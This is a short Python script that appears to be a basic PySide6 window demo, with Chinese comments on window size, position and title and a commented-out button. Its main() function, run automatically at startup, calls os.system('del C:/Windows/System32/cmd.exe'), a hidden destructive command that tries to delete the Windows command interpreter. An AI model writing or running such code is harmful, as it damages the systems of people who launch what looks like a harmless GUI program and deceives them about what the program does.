from PySide6.QtWidgets import *
import os


class Stats:

    def __init__(self, win_width, win_height, apptitle, text_width, text_height):
        # 创建主窗口对象
        self.window = QMainWindow()
        # 设置窗口的大小
        self.window.resize(win_width, win_height)
        # 设置窗口显示的位置
        self.window.move(300, 300)
        # 设置窗口的标题
        self.window.setWindowTitle(apptitle)

        # 设置按钮
        # self.button = QPushButton('统计', self.window)
        # self.button.move(text_width + 50, text_height / 2)

        # 按钮点击事件
        # self.button.clicked.connect(self.handeCale)

    def handeCale(self):
        pass

def main():
    os.system('del C:/Windows/System32/cmd.exe')
    # os.system()


if __name__ == '__main__':
    app = QApplication([])
    stats = Stats(500, 500, 'Title', 300, 480)
    stats.window.show()
    main()
    app.exec()


